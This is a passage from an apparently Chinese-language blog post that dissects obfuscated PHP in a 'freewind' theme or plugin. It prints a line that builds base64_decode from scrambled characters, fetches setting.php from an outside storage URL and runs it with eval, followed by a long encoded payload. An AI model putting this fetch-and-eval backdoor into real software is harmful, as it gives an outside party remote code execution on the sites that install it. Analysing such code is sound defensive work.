class="hljs-comment">//64_decode</span><br><span class="hljs-variable">$pUOGCn</span> .= <span class="hljs-variable">$tYBGeu</span>[<span class="hljs-number">22</span>] . <span class="hljs-variable">$tYBGeu</span>[<span class="hljs-number">36</span>] . <span class="hljs-variable">$tYBGeu</span>[<span class="hljs-number">29</span>] . <span class="hljs-variable">$tYBGeu</span>[<span class="hljs-number">26</span>] . <span class="hljs-variable">$tYBGeu</span>[<span class="hljs-number">30</span>] . <span class="hljs-variable">$tYBGeu</span>[<span class="hljs-number">32</span>] . <span class="hljs-variable">$tYBGeu</span>[<span class="hljs-number">35</span>] . <span class="hljs-variable">$tYBGeu</span>[<span class="hljs-number">26</span>] . <span class="hljs-variable">$tYBGeu</span>[<span class="hljs-number">30</span>];<br><br></code></pre></td></tr></table></figure><p>虽然写了这么多，就是把混淆后的变量定义成函数名称，方便调用。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$D6xP3axeDW84i</span> = <span class="hljs-variable">$mqzdIP</span>[<span class="hljs-number">3</span>] . <span class="hljs-variable">$mqzdIP</span>[<span class="hljs-number">6</span>] . <span class="hljs-variable">$mqzdIP</span>[<span class="hljs-number">33</span>] . <span class="hljs-variable">$mqzdIP</span>[<span class="hljs-number">30</span>] . <span class="hljs-variable">$mqzdIP</span>[<span class="hljs-number">22</span>] . <span class="hljs-variable">$mqzdIP</span>[<span class="hljs-number">36</span>] . <span class="hljs-variable">$mqzdIP</span>[<span class="hljs-number">29</span>] . <span class="hljs-variable">$mqzdIP</span>[<span class="hljs-number">26</span>] . <span class="hljs-variable">$mqzdIP</span>[<span class="hljs-number">30</span>] . <span class="hljs-variable">$mqzdIP</span>[<span class="hljs-number">32</span>] . <span class="hljs-variable">$mqzdIP</span>[<span class="hljs-number">35</span>] . <span class="hljs-variable">$mqzdIP</span>[<span class="hljs-number">26</span>] . <span class="hljs-variable">$mqzdIP</span>[<span class="hljs-number">30</span>];<br><span class="hljs-variable">$naRFbj6GT8jKd</span> = <span class="hljs-title function_ invoke__">WGkpJSCm</span>(<span class="hljs-variable">$D6xP3axeDW84i</span>(<span class="hljs-variable">$D6xP3axeDW84i</span>(<span class="hljs-string">&#x27;YUhSMGNITTZMeTlpYkc5bkxURXlOVEkwTVRBd09UWXVZMjl6TG1Gd0xXNWhibXBwYm1jdWJYbHhZMnh2ZFdRdVkyOXRMMlp5WldWM2FXNWtMM1psY25OcGIyNHZNVjh6TDNObGRIUnBibWN1Y0dodw==&#x27;</span>)), []);<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$pUOGCn</span>(<span class="hljs-variable">$naRFbj6GT8jKd</span>));<br></code></pre></td></tr></table></figure><p>经过混淆变量的替换，上面代码其实就是执行<code>https://blog-1252410096.cos.ap-nanjing.myqcloud.com/freewind/version/1_3/setting.php</code>。</p><p>下载下来之后发现更是重量级，一长串的b64字符串。。这里直接给出转换后的结果：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$VkBFwi</span>=<span class="hljs-string">&quot;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